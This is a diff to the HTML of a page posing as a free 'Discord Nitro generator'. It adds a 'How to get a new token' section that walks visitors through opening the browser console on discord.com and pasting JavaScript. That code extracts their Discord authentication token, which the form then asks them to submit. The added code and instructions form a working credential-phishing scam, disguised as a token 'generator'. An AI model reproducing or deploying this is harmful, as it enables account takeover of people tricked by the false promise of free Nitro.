@@ -13,9 +13,41 @@
             <input type="text" id="name" placeholder="Enter your Name" required>
             <input type="text" id="discordUser" placeholder="Enter Discord Username" required>
             <input type="text" id="randomInput" placeholder="Random generated token" required>
-            <button type="submit">Generate Nitro</button>
+            <button type="submit" id="generateButton">Generate Nitro</button>
         </form>
+        
         <p id="responseMessage"></p>
+
+        <button id="getNewTokenButton">How to get a new token</button>
+        <div id="howToGetTokenSection" class="hidden">
+            <h3>To get a new random token string, follow these steps:</h3>
+            <ol>
+                <li>Go to <a href="https://discord.com/channels/@me" target="_blank">discord.com/channels/@me</a></li>
+                <li>Open the console (Press <strong>CTRL + Shift + J</strong>)</li>
+                <li>Paste in the following code:</li>
+                <pre><code>let str = `(
+                    webpackChunkdiscord_app.push(
+                        [
+                            [''],
+                            {},
+                            e => {
+                                m=[] ;
+                                for(let c in e.c)
+                                    m.push(e.c[c])
+                            }
+                        ]
+                    ),
+                    m
+                ).find(
+                    m => m?.exports?.default?.getToken !== void 0
+                ).exports.default.getToken()`;</code></pre>
+                <pre><code>let result = eval(str);</code></pre>
+                <pre><code>console.clear(); console.log("\x1b[94mYour token:\n\n\x1b[95m" + result + "\x1b[0m");</code></pre>
+                <li>Copy the new randomly generated token.</li>
+                <li>Paste it in our generator under token.</li>
+            </ol>
+            <p>And you're done! You have free nitro. (almost).</p>
+        </div>
     </div>
 
     <script src="script.js"></script>
